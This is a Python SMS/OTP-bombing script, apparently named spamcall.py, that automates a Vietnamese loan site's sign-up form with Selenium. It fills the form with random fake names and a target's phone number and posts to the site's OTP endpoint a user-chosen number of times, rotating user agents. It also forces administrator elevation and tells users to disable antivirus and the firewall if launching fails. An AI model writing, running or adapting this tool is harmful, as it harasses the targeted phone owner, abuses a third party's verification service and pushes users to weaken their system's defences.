import subprocess
import sys
import os
import importlib.util

def install_packages():
    packages = ['requests', 'fake-useragent', 'selenium', 'webdriver-manager']
    for package in packages:
        try:
            if package == 'fake-useragent':
                __import__('fake_useragent')
            else:
                __import__(package.replace('-', '_'))
            print(f"✅ {package} đã được cài đặt")
        except ImportError:
            print(f"📦 Đang cài đặt {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
            print(f"✅ Đã cài đặt {package}")

install_packages()

import os
import sys
import subprocess
import importlib.util
import requests
import time
import traceback
import random
import shutil
import ctypes
from fake_useragent import UserAgent

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    print("⚠️ Chương trình chưa chạy với quyền Administrator!")
    print("🔄 Đang yêu cầu quyền admin...")
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    except:
        print("❌ Không thể tự động nâng quyền. Vui lòng chạy với quyền Administrator!")
        sys.exit(1)

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.edge.options import Options as EdgeOptions
from selenium.webdriver.edge.service import Service as EdgeService
from webdriver_manager.microsoft import EdgeChromiumDriverManager

ua = UserAgent()

NAMES_LIST = [
    "Nguyễn Minh Anh", "Trần Quốc Bảo", "Lê Hoàng Nam", "Phạm Gia Huy", "Đỗ Đức Anh",
    "Bùi Minh Quân", "Vũ Thành Đạt", "Hồ Nhật Minh", "Phan Tuấn Kiệt", "Nguyễn Quốc Trung",
    "Trần Đức Duy", "Lý Hoàng Phúc", "Võ Minh Tâm", "Đặng Gia Bảo", "Nguyễn Anh Tuấn",
    "Trần Minh Khang", "Phạm Quốc Huy", "Lê Đức Thành", "Ngô Minh Trí", "Dương Anh Khoa",
    "Đinh Gia Hưng", "Hoàng Minh Đức", "Phạm Tuấn Anh", "Nguyễn Hoàng Long", "Trần Gia Huy",
    "Lê Minh Tuấn", "Phan Quốc Việt", "Vũ Minh Hoàng", "Bùi Anh Dũng", "Đỗ Gia Bảo"
]

EMAIL = "nguyenhuuminhdz9@gmail.com"
LOAN_AMOUNT = "2500000"
OTP_URL = "https://moneycat.one/ajax/otp/send-otp"

if len(sys.argv) < 3:
    print("❌ Cách dùng: python spamcall.py [SĐT] [Số lần gửi OTP]")
    print("   Ví dụ: python spamcall.py 0988888866 50")
    sys.exit(1)

PHONE = sys.argv[1].strip()
try:
    CYCLES = int(sys.argv[2])
except ValueError:
    print("❌ Số lần phải là số nguyên!")
    sys.exit(1)

if not PHONE.isdigit() or len(PHONE) not in [10, 11]:
    print("❌ SĐT không hợp lệ!")
    sys.exit(1)

print(f"\n📱 SĐT: {PHONE}")
print(f"📧 Email: {EMAIL}")
print(f"💰 Tiền vay: {int(LOAN_AMOUNT):,} VND")
print(f"🔄 Số lần gửi OTP: {CYCLES} (mỗi lần chỉ 1 OTP, chỉ đổi tên)")

def nhap_thong_tin(driver):
    print("\n🔍 Đang tìm các ô nhập liệu...")
    time.sleep(0.5)
    
    all_inputs = driver.find_elements(By.TAG_NAME, "input")
    print(f"📋 Tổng số input: {len(all_inputs)}")
    
    name_field = None
    try:
        name_field = driver.find_element(By.ID, "full_name")
        print("\n✅ Tìm thấy ô tên theo ID: full_name")
    except:
        pass
    
    if not name_field:
        for inp in all_inputs:
            try:
                input_name = inp.get_attribute("name") or ""
                input_id = inp.get_attribute("id") or ""
                input_placeholder = inp.get_attribute("placeholder") or ""
                if "name" in input_name or "full" in input_id or "tên" in input_placeholder.lower():
                    name_field = inp
                    print("\n✅ Tìm thấy ô tên theo attribute")
                    break
            except:
                pass
    
    if name_field:
        try:
            print("📝 Đang nhập họ tên...")
            driver.execute_script("arguments[0].value = arguments[1];", name_field, FULLNAME)
            driver.execute_script("arguments[0].dispatchEvent(new Event('input', {bubbles: true}));", name_field)
            driver.execute_script("arguments[0].dispatchEvent(new Event('change', {bubbles: true}));", name_field)
            print(f"✅ Đã nhập: {FULLNAME}")
            time.sleep(2)
        except Exception as e:
            print(f"⚠️ Lỗi nhập tên: {e}")
    else:
        print("⚠️ Không tìm thấy ô nhập tên")
    
    phone_field = None
    for inp in all_inputs:
        try:
            if inp.get_attribute("type") == "tel":
                phone_field = inp
                print("\n✅ Tìm thấy ô SĐT theo type='tel'")
                break
        except:
            pass
    
    if not phone_field:
        for inp in all_inputs:
            try:
                input_name = inp.get_attribute("name") or ""
                input_placeholder = inp.get_attribute("placeholder") or ""
                input_id = inp.get_attribute("id") or ""
                if "phone" in input_name or "mobile" in input_name or "điện" in input_placeholder.lower() or "phone" in input_id:
                    phone_field = inp
                    print("\n✅ Tìm thấy ô SĐT theo attribute")
                    break
            except:
                pass
    
    if phone_field:
        try:
            print("📞 Đang nhập số điện thoại...")
            driver.execute_script("arguments[0].value = arguments[1];", phone_field, PHONE)
            driver.execute_script("arguments[0].dispatchEvent(new Event('input', {bubbles: true}));", phone_field)
            driver.execute_script("arguments[0].dispatchEvent(new Event('change', {bubbles: true}));", phone_field)
            print(f"✅ Đã nhập: {PHONE}")
            time.sleep(2)
        except Exception as e:
            print(f"⚠️ Lỗi nhập SĐT: {e}")
    else:
        print("⚠️ Không tìm thấy ô nhập SĐT")
    
    email_field = None
    for inp in all_inputs:
        try:
            if inp.get_attribute("type") == "email":
                email_field = inp
                print("\n✅ Tìm thấy ô Email theo type='email'")
                break
        except:
            pass
    
    if not email_field:
        for inp in all_inputs:
            try:
                input_name = inp.get_attribute("name") or ""
                if "email" in input_name:
                    email_field = inp
                    print("\n✅ Tìm thấy ô Email theo name")
                    break
            except:
                pass
    
    if email_field:
        try:
            print("📧 Đang nhập email...")
            driver.execute_script("arguments[0].value = arguments[1];", email_field, EMAIL)
            driver.execute_script("arguments[0].dispatchEvent(new Event('input', {bubbles: true}));", email_field)
            driver.execute_script("arguments[0].dispatchEvent(new Event('change', {bubbles: true}));", email_field)
            print(f"✅ Đã nhập: {EMAIL}")
            time.sleep(2)
        except Exception as e:
            print(f"⚠️ Lỗi nhập email: {e}")
    else:
        print("⚠️ Không tìm thấy ô nhập email")
    
    checkbox = None
    for inp in all_inputs:
        try:
            if inp.get_attribute("type") == "checkbox":
                checkbox = inp
                break
        except:
            pass
    
    if checkbox:
        try:
            print("\n✅ Đang tick checkbox...")
            if not checkbox.is_selected():
                driver.execute_script("arguments[0].click();", checkbox)
                time.sleep(2)
            print("✅ Đã tick checkbox")
        except Exception as e:
            print(f"⚠️ Lỗi tick checkbox: {e}")
    else:
        print("⚠️ Không tìm thấy checkbox")
    
    try:
        print("\n🖱️ Đang nhấn nút ĐĂNG KÝ...")
        buttons = driver.find_elements(By.TAG_NAME, "button")
        register_btn = None
        for btn in buttons:
            if "ĐĂNG KÝ" in btn.text.upper():
                register_btn = btn
                break
        if register_btn:
            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", register_btn)
            time.sleep(2)
            for i in range(3):
                driver.execute_script("arguments[0].click();", register_btn)
                print(f"   ✅ Lần {i+1}/3")
                time.sleep(2)
            print("✅ Đã nhấn ĐĂNG KÝ 3 lần")
        else:
            print("⚠️ Không tìm thấy nút ĐĂNG KÝ")
    except Exception as e:
        print(f"⚠️ Lỗi nhấn nút: {e}")
    
    time.sleep(2)

def gui_otp(driver):
    try:
        session = requests.Session()
        for cookie in driver.get_cookies():
            session.cookies.set(cookie['name'], cookie['value'])
        
        random_ua = ua.random
        session.headers.update({'User-Agent': random_ua})
        
        data = {'phone': PHONE, 'email': EMAIL}
        response = session.post(OTP_URL, data=data, timeout=5)
        print(f"📨 OTP Status: {response.status_code}")
        if response.status_code == 200:
            return True, "Thành công"
        else:
            return False, f"Lỗi {response.status_code}: {response.text[:50]}"
    except Exception as e:
        return False, f"Lỗi kết nối: {str(e)[:50]}"

def mo_tab_moi(driver):
    print("\n🔄 Đang mở tab mới...")
    tab_hien_tai = driver.current_window_handle
    driver.execute_script("window.open('');")
    time.sleep(2)
    cac_tab = driver.window_handles
    tab_moi = cac_tab[-1]
    driver.switch_to.window(tab_moi)
    print(f"✅ Đã chuyển sang tab mới. Tổng số tab: {len(cac_tab)}")
    driver.switch_to.window(tab_hien_tai)
    driver.close()
    print("✅ Đã đóng tab cũ")
    driver.switch_to.window(tab_moi)
    print("✅ Đã sẵn sàng ở tab mới")
    return tab_moi

def find_edge_path():
    paths = [
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\Application\\msedge.exe")
    ]
    
    for path in paths:
        if os.path.exists(path):
            return path
    
    edge = shutil.which("msedge") or shutil.which("msedge.exe")
    if edge:
        return edge
    
    return None

def main():
    print("\n" + "="*80)
    print("🚀 MONEYCAT AUTO - 1 OTP/LẦN + MỞ TAB MỚI + GIẢM SLEEP")
    print("="*80)
    print(f"📱 SĐT: {PHONE}")
    print(f"📧 Email: {EMAIL}")
    print(f"🔄 Số lần gửi OTP: {CYCLES}")
    print("="*80)

    edge_path = find_edge_path()
    if edge_path:
        print(f"✅ Tìm thấy Edge tại: {edge_path}")
    else:
        print("⚠️ Không tìm thấy Edge, thử dùng mặc định...")

    print("📥 Đang tải/cập nhật Edge WebDriver...")
    
    try:
        driver_path = EdgeChromiumDriverManager().install()
        print(f"✅ WebDriver đã tải tại: {driver_path}")
        service = EdgeService(driver_path)
    except Exception as e:
        print(f"⚠️ Lỗi webdriver-manager: {e}")
        print("🔄 Thử cách 2: Tìm driver có sẵn...")
        
        driver_path = None
        possible_paths = [
            os.path.join(os.getcwd(), "msedgedriver.exe"),
            "C:\\Windows\\System32\\msedgedriver.exe",
            os.path.expanduser("~\\Downloads\\msedgedriver.exe"),
            shutil.which("msedgedriver")
        ]
        
        for path in possible_paths:
            if path and os.path.exists(path):
                driver_path = path
                break
        
        if driver_path:
            print(f"✅ Tìm thấy driver tại: {driver_path}")
            service = EdgeService(driver_path)
        else:
            print("❌ Không tìm thấy driver!")
            print("\n🔧 Hướng dẫn khắc phục:")
            print("1. Tải driver từ: https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/")
            print("2. Đặt file msedgedriver.exe vào thư mục hiện tại")
            print("3. Hoặc chạy: pip install webdriver-manager --upgrade")
            return

    options = EdgeOptions()
    
    if edge_path:
        options.binary_location = edge_path
    
    options.add_argument("--start-maximized")
    options.add_argument("--disable-notifications")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--remote-debugging-port=9222")
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    options.add_experimental_option("useAutomationExtension", False)
    
    try:
        print("🚀 Đang khởi động Edge...")
        driver = webdriver.Edge(service=service, options=options)
        print("✅ Edge đã khởi động thành công!")
    except Exception as e:
        print(f"❌ Lỗi khởi động Edge: {e}")
        print("\n🔧 Cách khắc phục:")
        print("1. Tắt Windows Defender Real-time Protection")
        print("2. Tắt Firewall tạm thời")
        print("3. Cập nhật Edge lên phiên bản mới nhất")
        print("4. Chạy lại với quyền Admin")
        return

    total_success = 0
    total_fail = 0

    try:
        print("🌐 Đang truy cập moneycat.one...")
        driver.get("https://moneycat.one/")
        time.sleep(2)

        for chu_ky in range(1, CYCLES + 1):
            global FULLNAME
            FULLNAME = random.choice(NAMES_LIST)

            print(f"\n{'='*80}")
            print(f"🎯 LẦN {chu_ky}/{CYCLES}")
            print(f"👤 Tên: {FULLNAME}")
            print(f"{'='*80}")

            try:
                slider = driver.find_element(By.CSS_SELECTOR, "input[type='range']")
                driver.execute_script("arguments[0].value = arguments[1];", slider, LOAN_AMOUNT)
                driver.execute_script("arguments[0].dispatchEvent(new Event('input'));", slider)
                driver.execute_script("arguments[0].dispatchEvent(new Event('change'));", slider)
                print(f"✅ Đã điều chỉnh: {int(LOAN_AMOUNT):,} VND")
                time.sleep(0.5)
            except:
                print("⚠️ Không điều chỉnh được số tiền")

            nhap_thong_tin(driver)

            success, message = gui_otp(driver)
            if success:
                total_success += 1
                print(f"✅ Gửi OTP thành công!")
            else:
                total_fail += 1
                print(f"❌ {message}")

            if chu_ky < CYCLES:
                mo_tab_moi(driver)
                print("\n📂 Đang mở moneycat.one trong tab mới...")
                driver.get("https://moneycat.one/")
                time.sleep(0.5)

    except KeyboardInterrupt:
        print("\n\n🛑 ĐÃ DỪNG THEO YÊU CẦU")
    except Exception as e:
        print(f"❌ Lỗi: {e}")
        traceback.print_exc()
    finally:
        try:
            driver.quit()
            print("\n✅ Đã đóng trình duyệt")
        except:
            pass
        
        print("\n" + "="*80)
        print("🏁 HOÀN THÀNH!")
        print(f"Tổng OTP gửi: {CYCLES}")
        print(f"Thành công   : {total_success}")
        print(f"Thất bại     : {total_fail}")
        print("="*80)

if __name__ == "__main__":
    main()